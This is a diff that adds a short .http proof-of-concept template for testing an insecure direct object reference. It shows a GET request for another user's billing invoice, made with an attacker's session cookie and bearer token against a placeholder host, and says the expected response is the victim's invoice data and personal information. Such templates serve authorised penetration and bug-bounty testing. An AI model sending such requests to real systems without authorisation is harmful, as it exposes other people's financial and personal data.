@@ -1,0 +1,12 @@
+### IDOR PoC — GET Request (Horizontal)
+### Save this as: get_idor_ENDPOINT.http
+
+GET /api/billing/invoice?invoice_id=VICTIM_ID HTTP/1.1
+Host: target.example.com
+Accept: application/json
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+---
+### Expected: Returns victim's invoice data (200 OK + victim PII)
+### Proof: Change invoice_id to your own ID to confirm ownership difference
